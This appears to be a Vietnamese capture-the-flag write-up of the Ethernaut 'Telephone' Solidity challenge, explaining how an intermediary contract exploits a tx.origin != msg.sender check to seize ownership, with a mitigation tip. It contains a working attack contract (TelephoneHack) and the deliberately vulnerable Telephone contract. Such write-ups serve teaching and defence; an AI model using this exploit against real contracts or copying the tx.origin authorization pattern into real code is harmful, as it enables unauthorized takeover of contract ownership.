### Kết luận
- Lỗ hổng:
1. Contract tấn công TelephoneHack được thiết kế để vượt qua điều kiện `if` của hàm `changeOwner`.
2. `msg.sender` khi gọi `TelephoneHack.attack()` là địa chỉ của người dùng (attacker).
3. `tx.origin` vẫn là địa chỉ của người dùng (không đổi qua nhiều contract).
=> Do đó, msg.sender của contract Telephone sẽ là `address(TelephoneHack)` (contract trung gian) trong khi tx.origin vẫn là attacker, thỏa mãn điều kiện `tx.origin != msg.sender`.
=> Kẻ tấn công có thể thay đổi owner của contract Telephone.


- Cách phòng tránh:
1. Không nên sử dụng tx.origin () để kiểm tra quyền mà cần sử dụng msg.sender để an toàn hơn, hoặc có thể thêm xác thực bằng chữ kí số,..etc.
### Attack Contract
```solidity
// SPDX-License-Identifier: MIT
import './telephone.sol';
pragma solidity ^0.8.0;
interface ITelephone{
    function changeOwner(address _owner) external;
}
contract TelephoneHack{
    ITelephone public telephone;
    constructor (address _telephoneAddress){
        telephone = ITelephone(_telephoneAddress);
    }
    function attack() external payable{
        telephone.changeOwner(tx.origin); // Địa chỉ của attacker, người gửi giao dịch đầu tiên từ bên ngoài.
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner; // Lỗ hổng ở đây
        }
    }
}
```
